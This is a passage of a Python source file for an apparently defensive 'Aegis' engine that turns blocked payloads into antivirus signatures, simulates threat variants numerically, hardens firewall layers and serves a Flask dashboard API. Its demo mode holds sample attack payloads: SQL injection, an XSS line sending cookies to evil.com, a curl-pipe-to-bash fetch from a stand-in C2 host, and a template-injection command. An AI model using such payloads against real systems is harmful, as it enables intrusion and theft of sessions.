                ImmunityLevel.IMMUNE
        return MasterProfile(
            profile_id=pid,
            family_name=name,
            member_ids=ids,
            canonical_vec=cent,
            total_seen=len(cluster),
            av_sigs=[],
            immunity_level=imm,
            created_ts=now,
            last_updated=now,
        )


# ══════════════════════════════════════════════════════════════
# MUTATION ENGINE — variant simulation, future-threat prediction
# ══════════════════════════════════════════════════════════════



# ══════════════════════════════════════════════════════════════
# CATEGORY MUTATION PROFILES
# Defines realistic large-perturbation templates per threat class.
# Each profile specifies which feature dims are heavily modified
# to simulate actual evasion techniques (packing, obfuscation,
# code transposition) rather than uniform ±7.5% noise.
# ══════════════════════════════════════════════════════════════

@dataclass
class CategoryMutationProfile:
    """Per-category large-perturbation template for realistic variant simulation."""
    category:     str
    # (dim_index, new_value_override) — applied before LCG noise
    overrides:    List[Tuple[int, float]]
    # Additional scalar noise range on top of LCG (0.0–1.0)
    extra_noise:  float
    description:  str

_MUTATION_PROFILES: Dict[str, CategoryMutationProfile] = {
    # Packed/encrypted malware: entropy spikes, printable drops to near-zero,
    # PE header flag cleared (packer hides it), compression ratio approaches 1
    'MALWARE': CategoryMutationProfile(
        category='MALWARE',
        overrides=[(0, 0.95), (8, 0.0), (16, 0.02), (40, 0.05)],
        extra_noise=0.35,
        description='Packer/encryptor simulation: max entropy, strip PE header, kill printable'
    ),
    # Obfuscated injections: encoding layers added, pattern flags zeroed
    'INJECTION': CategoryMutationProfile(
        category='INJECTION',
        overrides=[(8, 0.0), (9, 0.0), (10, 0.0), (18, 0.9), (19, 0.8)],
        extra_noise=0.25,
        description='Encoding evasion: zero pattern flags, spike URL-encoded/hex blocks'
    ),
    # Shell backdoors mutated to script files: shebang added, imports spike
    'CMD/SHELL': CategoryMutationProfile(
        category='CMD/SHELL',
        overrides=[(32, 1.0), (33, 0.8), (34, 0.6), (12, 0.0)],
        extra_noise=0.20,
        description='Backdoor-to-script mutation: add shebang, imports, clear cmd pattern'
    ),
    # SIP/VoIP evasion: change User-Agent tokens, alter SIP method patterns
    'VOIP_SPAM': CategoryMutationProfile(
        category='VOIP_SPAM',
        overrides=[(56, 0.8), (57, 0.5), (8, 0.0), (16, 0.7)],
        extra_noise=0.30,
        description='SIP obfuscation: rotate IPs/URLs, clear detection patterns'
    ),
    # Phishing: homoglyph domains change URL density, keep printable high
    'PHISHING': CategoryMutationProfile(
        category='PHISHING',
        overrides=[(56, 0.95), (16, 0.92), (40, 0.85)],
        extra_noise=0.15,
        description='Homoglyph/domain-spoof: max URL density, high printable'
    ),
    # Default: moderate noise across all dims
    '_DEFAULT': CategoryMutationProfile(
        category='_DEFAULT',
        overrides=[],
        extra_noise=0.15,
        description='Generic perturbation — no category-specific template'
    ),
}

class MutationEngine:
    """
    Takes ThreatDNA and generates N variant simulations by perturbing
    the feature vector using the deterministic mutation seeds.
    This predicts future mutations BEFORE they appear in the wild.
    All simulation is mathematical — no actual malware code is generated.
    """

    def __init__(self, db: AegisDatabase, cycles: int = MUTATION_CYCLES):
        self.db     = db
        self.cycles = cycles

    def mutate(self, dna: ThreatDNA) -> List[ThreatDNA]:
        variants: List[ThreatDNA] = []
        for gen in range(self.cycles):
            seed = dna.mutation_seeds[gen % len(dna.mutation_seeds)]
            variant = self._generate_variant(dna, gen + 1, seed)
            variants.append(variant)
            self.db.save_dna(variant)
        self.db.log_defense_event(
            'MUTATION',
            f"Generated {self.cycles} variants from {dna.threat_id[:12]} [{dna.category}]",
            delta=self.cycles * 1.2
        )
        return variants

    @staticmethod
    def _generate_variant(parent: ThreatDNA, gen: int, seed: int) -> ThreatDNA:
        """
        Perturb the parent feature vector using a category-aware mutation
        profile + LCG noise.  Each generation uses a different seed so
        variants diverge enough to avoid immediate re-clustering.
        """
        profile = (_MUTATION_PROFILES.get(parent.category.upper())
                   or _MUTATION_PROFILES['_DEFAULT'])
        # Start with parent vector
        lcg       = seed & 0xFFFFFFFF
        perturbed = list(parent.feature_vec)

        # Step 1: Apply category-specific large overrides first
        #   Use LCG to blend between parent and override so each generation
        #   lands at a different point along the mutation axis.
        for dim, target_val in profile.overrides:
            lcg = (1664525 * lcg + 1013904223) & 0xFFFFFFFF
            blend = (lcg & 0xFFFF) / 0xFFFF   # 0.0-1.0
            # Higher generation number = stronger blend toward override
            strength = min(1.0, blend * (0.3 + gen * 0.1))
            perturbed[dim] = max(0.0, min(1.0,
                perturbed[dim] * (1.0 - strength) + target_val * strength
            ))

        # Step 2: Apply LCG noise across all dims (scaled by profile extra_noise)
        noise_scale = profile.extra_noise
        for i in range(len(perturbed)):
            lcg = (1664525 * lcg + 1013904223) & 0xFFFFFFFF
            noise = ((lcg & 0xFFFF) / 0xFFFF - 0.5) * noise_scale
            perturbed[i] = max(0.0, min(1.0, perturbed[i] + noise))


        now = datetime.utcnow().isoformat()
        h   = hashlib.sha256(
            json.dumps(perturbed).encode() + str(seed).encode()
        ).hexdigest()
        return ThreatDNA(
            threat_id=f"MUT-{parent.threat_id[:8]}-G{gen:02d}-{h[:8]}",
            category=parent.category,
            source_hash=h,
            feature_vec=[round(v, 6) for v in perturbed],
            entropy=parent.entropy + (((seed & 0xFF) / 0xFF) - 0.5) * 0.8,
            byte_patterns=parent.byte_patterns[:10],
            string_iocs=parent.string_iocs[:5],
            mutation_seeds=[
                (s ^ (seed >> (i % 16))) & 0xFFFFFFFF
                for i, s in enumerate(parent.mutation_seeds)
            ],
            extraction_ts=now,
            confidence=max(0.1, parent.confidence - gen * 0.04),
        )


# ══════════════════════════════════════════════════════════════
# AV CONVERSION ENGINE — threat → anti-virus signature
# ══════════════════════════════════════════════════════════════

class AVConversionEngine:
    """
    Flips the code of every reverse-engineered threat to create a custom
    Anti-Virus Signature.  Three signature types are generated per threat:
      1. byte_pattern  — hex pattern match rule
      2. heuristic     — entropy + feature-vector threshold rule
      3. behavioral    — IOC-based detection rule
    """

    def __init__(self, db: AegisDatabase):
        self.db = db

    def convert(self, dna: ThreatDNA) -> List[AVSignature]:
        sigs: List[AVSignature] = []

        # 1 — byte_pattern sig
        if dna.byte_patterns:
            bp_sig = self._byte_pattern_sig(dna)
            sigs.append(bp_sig)
            self.db.save_sig(bp_sig)

        # 2 — heuristic sig (entropy + top feature dims)
        heur_sig = self._heuristic_sig(dna)
        sigs.append(heur_sig)
        self.db.save_sig(heur_sig)

        # 3 — behavioral / IOC sig
        if dna.string_iocs:
            beh_sig = self._behavioral_sig(dna)
            sigs.append(beh_sig)
            self.db.save_sig(beh_sig)

        self.db.log_defense_event(
            'AV_CONVERSION',
            f"Created {len(sigs)} AV sigs from {dna.threat_id[:12]} [{dna.category}]",
            delta=len(sigs) * 2.5
        )
        return sigs

    @staticmethod
    def _layer_targets_for_category(category: str) -> List[int]:
        """Map threat category to which firewall layers should receive the sig."""
        mapping = {
            'MALWARE':     [1, 6, 14, 20],
            'VPS/VPN':     [2, 12],
            'PROXIES':     [3],
            'WEB SOCKETS': [4],
            'SNIFFERS':    [5],
            'PEN TOOLS':   [6, 14],
            'ADWARE':      [7],
            'SPOOFING':    [8],
            'DECRYPT':     [9, 21],
            'REVERSE ENG': [10],
            'CMD/SHELL':   [11, 13],
            'DDOS':        [12],
            'INJECTION':   [13],
            'ZERO-DAY':    [14, 20],
            'PHISHING':    [17],
            'IOT':         [18],
            'VOIP':        [22],
            'VOIP_SPAM':   [22],
            'SPAM_CALLER': [22],
            'TOLL_FRAUD':  [22],
        }
        # normalize
        key = category.upper()
        for k, v in mapping.items():
            if k in key:
                return v
        return [1, 14, 20]   # default to broad coverage

    def _byte_pattern_sig(self, dna: ThreatDNA) -> AVSignature:
        # Build a regex OR-pattern from the extracted byte patterns
        parts = []
        for p in dna.byte_patterns[:6]:
            if ':' in p:
                _, hx = p.split(':', 1)
                # Convert hex to regex byte pattern
                try:
                    raw = bytes.fromhex(hx[:32])
                    parts.append(re.escape(raw.decode('latin-1')))
                except Exception:
                    pass
        pattern = '|'.join(parts) if parts else dna.source_hash[:16]
        return AVSignature(
            sig_id=f"SIG-BP-{dna.threat_id[:8]}-{uuid.uuid4().hex[:6].upper()}",
            parent_id=dna.threat_id,
            sig_type='byte_pattern',
            pattern=pattern[:500],
            layer_targets=self._layer_targets_for_category(dna.category),
            confidence=dna.confidence,
            mutation_gen=0,
            created_ts=datetime.utcnow().isoformat(),
        )

    def _heuristic_sig(self, dna: ThreatDNA) -> AVSignature:
        # Encode the top-10 highest-weight dimensions as the heuristic rule
        indexed = sorted(enumerate(dna.feature_vec), key=lambda x: -x[1])
        top10   = [(idx, val) for idx, val in indexed[:10] if val > 0.05]
        rule    = json.dumps({'entropy_min': round(dna.entropy * 0.85, 3),
                              'feature_dims': top10,
                              'confidence_floor': round(dna.confidence * 0.7, 3)})
        return AVSignature(
            sig_id=f"SIG-HE-{dna.threat_id[:8]}-{uuid.uuid4().hex[:6].upper()}",
            parent_id=dna.threat_id,
            sig_type='heuristic',
            pattern=rule[:1000],
            layer_targets=list(range(1, 22)),   # heuristics go to all layers
            confidence=dna.confidence * 0.85,
            mutation_gen=0,
            created_ts=datetime.utcnow().isoformat(),
        )

    def _behavioral_sig(self, dna: ThreatDNA) -> AVSignature:
        # IOC-based pattern: URL, IP, b64 blocks
        ioc_patterns = []
        for ioc in dna.string_iocs[:8]:
            if ioc.startswith('http'):
                # Extract domain portion
                m = re.match(r'https?://([^/]+)', ioc)
                if m:
                    ioc_patterns.append(re.escape(m.group(1)))
            elif re.match(r'\d+\.\d+\.\d+\.\d+', ioc):
                ioc_patterns.append(re.escape(ioc))
        pattern = '|'.join(ioc_patterns) if ioc_patterns else f"SHA256:{dna.source_hash[:32]}"
        return AVSignature(
            sig_id=f"SIG-BH-{dna.threat_id[:8]}-{uuid.uuid4().hex[:6].upper()}",
            parent_id=dna.threat_id,
            sig_type='behavioral',
            pattern=pattern[:500],
            layer_targets=self._layer_targets_for_category(dna.category),
            confidence=dna.confidence * 0.75,
            mutation_gen=0,
            created_ts=datetime.utcnow().isoformat(),
        )


# ══════════════════════════════════════════════════════════════
# HEURISTIC EVOLUTION ENGINE — learns from Vault, hardens layers
# ══════════════════════════════════════════════════════════════

class HeuristicEvolutionEngine:
    """
    Extracts threat DNA from the Vault and automatically updates the
    21-layer firewall rules.  Every new Vault entry increases the Defense
    Rating.  Layer immunity levels upgrade as signature coverage grows.
    """

    IMMUNITY_THRESHOLDS = {
        ImmunityLevel.PARTIAL:  2,
        ImmunityLevel.HARDENED: 8,
        ImmunityLevel.IMMUNE:   20,
    }

    def __init__(self, db: AegisDatabase):
        self.db = db

    def evolve(self) -> dict:
        """
        Run one evolution cycle.
        Returns a summary of changes made.
        """
        result = {'layers_upgraded': 0, 'sigs_deployed': 0, 'defense_delta': 0.0}

        # Deploy any pending AV signatures
        pending = self.db.undeployed_sigs()
        if not pending:
            return result

        # Group sigs by target layer
        by_layer: Dict[int, List[AVSignature]] = defaultdict(list)
        for sig in pending:
            for layer_id in sig.layer_targets:
                by_layer[layer_id].append(sig)

        layer_stats = {row['layer_id']: row for row in self.db.get_layer_stats()}

        for layer_id, sigs in by_layer.items():
            if layer_id not in layer_stats:
                continue
            current  = layer_stats[layer_id]
            new_count = current['sig_count'] + len(sigs)
            bonus     = min(50.0, new_count * 0.4)     # cap at +50 to defense

            # Determine new immunity level
            new_immunity = ImmunityLevel.NONE
            for level, threshold in sorted(
                self.IMMUNITY_THRESHOLDS.items(), key=lambda x: x[1]
            ):
                if new_count >= threshold:
                    new_immunity = level

            old_immunity = ImmunityLevel(current['immunity'])
            self.db.update_layer_immunity(layer_id, new_immunity, bonus, new_count)

            if new_immunity.value > old_immunity.value:
                result['layers_upgraded'] += 1
                self.db.log_defense_event(
                    'LAYER_HARDENED',
                    f"Layer {layer_id} upgraded to {new_immunity.name}",
                    delta=5.0 * new_immunity.value
                )

        # Mark sigs as deployed
        self.db.mark_sigs_deployed([s.sig_id for s in pending])
        result['sigs_deployed'] = len(pending)
        result['defense_delta'] = len(pending) * 0.8

        self.db.log_defense_event(
            'EVOLUTION_CYCLE',
            f"Deployed {len(pending)} signatures across {len(by_layer)} layers",
            delta=result['defense_delta']
        )

        return result


# ══════════════════════════════════════════════════════════════
# ISOLATION CHAMBER — managed sandbox with progress tracking
# ══════════════════════════════════════════════════════════════

class IsolationChamber:
    """
    Manages the staged processing of detected threats:
    DETECTED → ISOLATED → REVERSING → REVERSED → CONVERTING → EXPORTED → ARMED

    Each stage runs in a background thread and updates the chamber DB record.
    All analysis is static (DNAExtractor) — no code execution.
    """

    STAGE_DURATION = {
        ThreatStage.DETECTED:   0.5,
        ThreatStage.ISOLATED:   1.0,
        ThreatStage.REVERSING:  4.0,
        ThreatStage.REVERSED:   0.5,
        ThreatStage.CONVERTING: 2.0,
        ThreatStage.EXPORTED:   0.5,
        ThreatStage.MUTATING:   3.0,
        ThreatStage.ARMED:      0.0,
    }

    STAGE_LOG_TEMPLATES = {
        ThreatStage.ISOLATED:  "[{ts}] ISOLATED: {cat} >> quarantine sector allocated",
        ThreatStage.REVERSING: "[{ts}] REVERSING: extracting DNA features...",
        ThreatStage.REVERSED:  "[{ts}] REVERSED: DNA fingerprint complete — {dna}",
        ThreatStage.CONVERTING:"[{ts}] CONVERTING: generating AV signatures...",
        ThreatStage.EXPORTED:  "[{ts}] EXPORTED: {sigs} signatures written to Vault",
        ThreatStage.MUTATING:  "[{ts}] MUTATING: simulating {n} variant generations",
        ThreatStage.ARMED:     "[{ts}] ARMED: deployed across {layers} layers",
    }

    def __init__(self, db: AegisDatabase, dna_extractor: DNAExtractor,
                 av_engine: AVConversionEngine, mutation_engine: MutationEngine,
                 evolution_engine: HeuristicEvolutionEngine):
        self.db        = db
        self.extractor = dna_extractor
        self.av        = av_engine
        self.mutator   = mutation_engine
        self.evolve    = evolution_engine
        self._active: Dict[str, threading.Thread] = {}

    def ingest(self, payload: bytes, category: str = 'UNKNOWN') -> ChamberItem:
        """Accept a raw payload, create a ChamberItem, and start processing."""
        now  = datetime.utcnow().isoformat()
        item = ChamberItem(
            item_id=f"CH-{uuid.uuid4().hex[:12].upper()}",
            threat_category=category.upper(),
            stage=ThreatStage.DETECTED,
            progress=0,
            eta_seconds=sum(self.STAGE_DURATION.values()),
            reverse_log=[f"[{now}] DETECTED: {category} — {len(payload)} bytes ingested"],
            dna_id=None,
            enqueued_ts=now,
            completed_ts=None,
        )
        self.db.upsert_chamber(item)
        t = threading.Thread(target=self._process, args=(item, payload), daemon=True)
        self._active[item.item_id] = t
        t.start()
        return item

    def _process(self, item: ChamberItem, payload: bytes):
        def _log(stage: ThreatStage, **kwargs):
            ts  = datetime.utcnow().strftime('%H:%M:%S')
            tpl = self.STAGE_LOG_TEMPLATES.get(stage, "[{ts}] {stage}")
            msg = tpl.format(ts=ts, cat=item.threat_category,
                             stage=stage.value, **kwargs)
            item.reverse_log.append(msg)
            item.stage    = stage
            item.progress = self._stage_progress(stage)
            self.db.upsert_chamber(item)
            time.sleep(self.STAGE_DURATION[stage])

        try:
            _log(ThreatStage.ISOLATED)
            _log(ThreatStage.REVERSING)

            dna = self.extractor.extract(payload, item.threat_category)
            self.db.save_dna(dna)
            item.dna_id = dna.threat_id
            _log(ThreatStage.REVERSED, dna=dna.threat_id[:16])

            sigs = self.av.convert(dna)
            _log(ThreatStage.CONVERTING)
            _log(ThreatStage.EXPORTED, sigs=len(sigs))

            variants = self.mutator.mutate(dna)
            _log(ThreatStage.MUTATING, n=len(variants))

            result = self.evolve.evolve()
            _log(ThreatStage.ARMED,
                 layers=len(set(l for s in sigs for l in s.layer_targets)))

            item.stage        = ThreatStage.ARMED
            item.progress     = 100
            item.completed_ts = datetime.utcnow().isoformat()
            item.eta_seconds  = 0.0
            self.db.upsert_chamber(item)

            self.db.log_defense_event(
                'THREAT_ARMED',
                f"Full cycle complete for {item.item_id[:12]} [{item.threat_category}]",
                delta=10.0 + result.get('defense_delta', 0)
            )

        except Exception as exc:
            item.reverse_log.append(f"[ERROR] {exc}")
            self.db.upsert_chamber(item)
            log.error(f"Chamber processing error for {item.item_id}: {exc}")
        finally:
            self._active.pop(item.item_id, None)

    @staticmethod
    def _stage_progress(stage: ThreatStage) -> int:
        return {
            ThreatStage.DETECTED:   5,
            ThreatStage.ISOLATED:   15,
            ThreatStage.REVERSING:  35,
            ThreatStage.REVERSED:   50,
            ThreatStage.CONVERTING: 65,
            ThreatStage.EXPORTED:   80,
            ThreatStage.MUTATING:   90,
            ThreatStage.ARMED:      100,
        }.get(stage, 0)


# ══════════════════════════════════════════════════════════════
# AEGIS ORCHESTRATOR — full autonomous Search & Destroy cycle
# ══════════════════════════════════════════════════════════════

class AegisOrchestrator:
    """
    Top-level controller that integrates all Aegis sub-engines.
    Call `inspect_and_respond()` to run the full S&D pipeline on any payload.
    Optionally integrate with `zeus_firewall_v1.ZeusFirewall` for live gating.
    """

    def __init__(self, db_path: str = AEGIS_DB, firewall=None):
        self.db        = AegisDatabase(db_path)
        self.extractor = DNAExtractor()
        self.synthesis = SynthesisEngine(self.db)
        self.av_engine = AVConversionEngine(self.db)
        self.mutator   = MutationEngine(self.db)
        self.evolution = HeuristicEvolutionEngine(self.db)
        self.chamber   = IsolationChamber(
            self.db, self.extractor, self.av_engine, self.mutator, self.evolution
        )
        self.firewall  = firewall   # optional ZeusFirewall integration
        self._auto_thread: Optional[threading.Thread] = None
        self._running  = False

    # ── public API ────────────────────────────────────────────

    def inspect_and_respond(self, payload: bytes, category: str = 'UNKNOWN') -> dict:
        """
        Full pipeline: detect → isolate → reverse → convert → mutate → arm.
        Returns immediately; processing continues in background.
        """
        item = self.chamber.ingest(payload, category)
        return {
            'item_id':   item.item_id,
            'category':  item.threat_category,
            'stage':     item.stage.value,
            'eta':       item.eta_seconds,
            'message':   f"Threat ingested. Processing in background. Item: {item.item_id}",
        }

    def run_synthesis_pass(self) -> dict:
        merges = self.synthesis.run()
        return {'merges': merges, 'defense_rating': self.db.defense_rating()}

    def run_evolution_pass(self) -> dict:
        result = self.evolution.evolve()
        result['defense_rating'] = self.db.defense_rating()
        return result

    def start_autonomous(self, interval_seconds: float = 60.0):
        """Start background autonomous evolution loop."""
        if self._running:
            return
        self._running = True
        self._auto_thread = threading.Thread(
            target=self._autonomous_loop,
            args=(interval_seconds,),
            daemon=True
        )
        self._auto_thread.start()
        log.info(f"[AEGIS] Autonomous mode started (interval={interval_seconds}s)")

    def stop_autonomous(self):
        self._running = False

    def _autonomous_loop(self, interval: float):
        while self._running:
            try:
                self.synthesis.run()
                self.evolution.evolve()
            except Exception as exc:
                log.error(f"[AEGIS] Autonomous loop error: {exc}")
            time.sleep(interval)

    def status(self) -> dict:
        vault  = self.db.vault_stats()
        layers = self.db.get_layer_stats()
        dr     = self.db.defense_rating()
        events = self.db.recent_events(10)
        active = [asdict(ci) for ci in self.db.chamber_items(active_only=True)]
        # convert enums to strings in active items
        for a in active:
            a['stage'] = a['stage'] if isinstance(a['stage'], str) else a['stage'].value
        return {
            'engine_version':  ENGINE_VERSION,
            'attrib':          ATTRIB,
            'defense_rating':  round(dr, 2),
            'vault':           vault,
            'layer_count':     len(layers),
            'active_chamber':  len(active),
            'recent_events':   events,
            'autonomous':      self._running,
        }

    def layer_overview(self) -> List[dict]:
        stats  = {row['layer_id']: row for row in self.db.get_layer_stats()}
        result = []
        for lid, name, desc in LAYER_DEFINITIONS:
            row = stats.get(lid, {})
            result.append({
                'layer_id':    lid,
                'name':        name,
                'description': desc,
                'immunity':    ImmunityLevel(row.get('immunity', 0)).name,
                'defense_bonus': round(row.get('defense_bonus', 0), 2),
                'sig_count':   row.get('sig_count', 0),
                'blocks_today': row.get('blocks_today', 0),
                'status':      (
                    'IMMUNE'    if row.get('immunity', 0) == 3 else
                    'HARDENED'  if row.get('immunity', 0) == 2 else
                    'PARTIAL'   if row.get('immunity', 0) == 1 else
                    'HEURISTIC' if row.get('sig_count', 0) == 0 else
                    'OPERATIONAL'
                ),
            })
        return result


# ══════════════════════════════════════════════════════════════
# FLASK BLUEPRINT  — Dashboard API routes
# ══════════════════════════════════════════════════════════════

def create_aegis_blueprint(orchestrator: AegisOrchestrator):
    """
    Creates and returns a Flask Blueprint for the Aegis dashboard.
    Mount with:
        from zeus_aegis_engine import AegisOrchestrator, create_aegis_blueprint
        orch = AegisOrchestrator()
        orch.start_autonomous()
        app.register_blueprint(create_aegis_blueprint(orch))
    """
    try:
        from flask import Blueprint, jsonify, request, send_file
        import io
    except ImportError:
        log.warning("[AEGIS] Flask not available — Blueprint not created")
        return None

    bp = Blueprint('aegis', __name__, url_prefix='/api/aegis')

    @bp.route('/status')
    def status():
        return jsonify(orchestrator.status())

    @bp.route('/layers')
    def layers():
        return jsonify(orchestrator.layer_overview())

    @bp.route('/vault')
    def vault():
        stats    = orchestrator.db.vault_stats()
        profiles = [asdict(p) for p in orchestrator.db.all_profiles()]
        sigs     = [asdict(s) for s in orchestrator.db.all_sigs(limit=100)]
        # Serialise enums
        for p in profiles:
            p['immunity_level'] = p['immunity_level'] if isinstance(
                p['immunity_level'], str) else ImmunityLevel(p['immunity_level']).name
        return jsonify({'stats': stats, 'profiles': profiles, 'signatures': sigs[:50]})

    @bp.route('/chamber')
    def chamber():
        items = orchestrator.db.chamber_items()
        result = []
        for item in items:
            d = asdict(item)
            d['stage'] = item.stage.value
            result.append(d)
        return jsonify(result)

    @bp.route('/ingest', methods=['POST'])
    def ingest():
        """Accept raw payload bytes for isolation & processing."""
        data     = request.get_data()
        category = request.args.get('category', 'UNKNOWN').upper()
        if not data:
            return jsonify({'error': 'No payload provided'}), 400
        result = orchestrator.inspect_and_respond(data, category)
        return jsonify(result)

    @bp.route('/synthesise', methods=['POST'])
    def synthesise():
        result = orchestrator.run_synthesis_pass()
        return jsonify(result)

    @bp.route('/evolve', methods=['POST'])
    def evolve():
        result = orchestrator.run_evolution_pass()
        return jsonify(result)

    @bp.route('/events')
    def events():
        limit  = int(request.args.get('limit', 50))
        events = orchestrator.db.recent_events(limit)
        return jsonify({
            'events':         events,
            'defense_rating': round(orchestrator.db.defense_rating(), 2),
        })

    @bp.route('/dashboard')
    def dashboard():
        """Serve the Aegis-21 dashboard HTML."""
        dashboard_path = os.path.join(
            os.path.dirname(__file__), 'zeus_aegis_dashboard.html'
        )
        if os.path.exists(dashboard_path):
            return send_file(dashboard_path, mimetype='text/html')
        return jsonify({'error': 'Dashboard HTML not found'}), 404

    log.info("[AEGIS] Blueprint registered at /api/aegis/*")
    return bp


# ══════════════════════════════════════════════════════════════
# INTEGRATION HELPER  — wire into existing ZeusFirewall
# ══════════════════════════════════════════════════════════════

def attach_to_zeus_firewall(firewall, aegis_db: str = AEGIS_DB) -> AegisOrchestrator:
    """
    Attach the Aegis engine to an existing ZeusFirewall instance.
    After this, every BLOCK verdict is automatically sent to the Isolation Chamber.

    Usage:
        from zeus_firewall_v1 import ZeusFirewall
        from zeus_aegis_engine import attach_to_zeus_firewall
        fw   = ZeusFirewall()
        orch = attach_to_zeus_firewall(fw)
        orch.start_autonomous()
    """
    orch = AegisOrchestrator(aegis_db, firewall=firewall)

    original_inspect = firewall.inspect

    def patched_inspect(*args, **kwargs):
        result = original_inspect(*args, **kwargs)
        verdict_val = result.get('verdict', '')
        # Accept both string 'block' and Verdict.BLOCK.value
        is_block = (verdict_val == 'block' or
                    (hasattr(verdict_val, 'value') and verdict_val.value == 'block'))
        if is_block or result.get('risk_score', 0) >= 40:
            try:
                body     = kwargs.get('body') or (args[4] if len(args) > 4 else b'')
                tags     = result.get('threat_tags', [])
                category = tags[0].upper().split(':')[0] if tags else 'UNKNOWN'
                orch.chamber.ingest(body or b'BLOCKED', category)
                orch.db.increment_blocks_for_tags(tags)
            except Exception as exc:
                log.warning(f"[AEGIS] attach hook error: {exc}")
        return result

    firewall.inspect = patched_inspect
    log.info("[AEGIS] Attached to ZeusFirewall — BLOCK verdicts auto-ingested")
    return orch


# ══════════════════════════════════════════════════════════════
# STANDALONE ENTRY POINT
# ══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    import argparse, pprint

    parser = argparse.ArgumentParser(description='Zeus Aegis Engine v2 — The Zeus Project 2026')
    parser.add_argument('--mode',     default='status',
                        choices=['status', 'ingest', 'evolve', 'synthesise', 'demo'])
    parser.add_argument('--payload',  default='', help='Hex or text payload for ingest mode')
    parser.add_argument('--category', default='MALWARE')
    parser.add_argument('--db',       default=AEGIS_DB)
    args = parser.parse_args()

    orch = AegisOrchestrator(db_path=args.db)

    if args.mode == 'status':
        pprint.pprint(orch.status())

    elif args.mode == 'ingest':
        payload = bytes.fromhex(args.payload) if args.payload else os.urandom(512)
        result  = orch.inspect_and_respond(payload, args.category)
        print(json.dumps(result, indent=2))
        time.sleep(15)   # wait for background processing
        print("\n=== Chamber State ===")
        for item in orch.db.chamber_items():
            print(f"  {item.item_id} | {item.stage.value} | {item.progress}%")

    elif args.mode == 'evolve':
        result = orch.run_evolution_pass()
        print(json.dumps(result, indent=2))

    elif args.mode == 'synthesise':
        result = orch.run_synthesis_pass()
        print(json.dumps(result, indent=2))

    elif args.mode == 'demo':
        print("=== AEGIS-21 ENGINE DEMO ===\n")
        test_payloads = [
            (b"SELECT * FROM users WHERE id='1' UNION SELECT * FROM admin--",
             'INJECTION'),
            (b"<script>document.location='http://evil.com/'+document.cookie</script>",
             'INJECTION'),
            (b"#!/bin/bash\ncurl http://c2.evil.com/backdoor.sh | bash",
             'CMD/SHELL'),
            (b"\x4d\x5a\x90\x00\x03\x00\x00\x00" + os.urandom(256),
             'MALWARE'),
            (b"{{7*7}}{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
             'INJECTION'),
        ]
        for payload, cat in test_payloads:
            result = orch.inspect_and_respond(payload, cat)
            print(f"  [{cat:12s}] Item: {result['item_id']}")

        print("\nWaiting for all chamber items to process...")
        time.sleep(20)

        print("\n=== Layer Overview ===")
        for layer in orch.layer_overview():
            sig_count = layer['sig_count']
            status    = layer['status']
            print(f"  LAY-{layer['layer_id']:02d}  {layer['name']:20s}  {status:12s}  sigs={sig_count}")

        print(f"\n=== Defense Rating: {orch.db.defense_rating():.1f} ===")
        print(f"=== Vault: {orch.db.vault_stats()} ===")
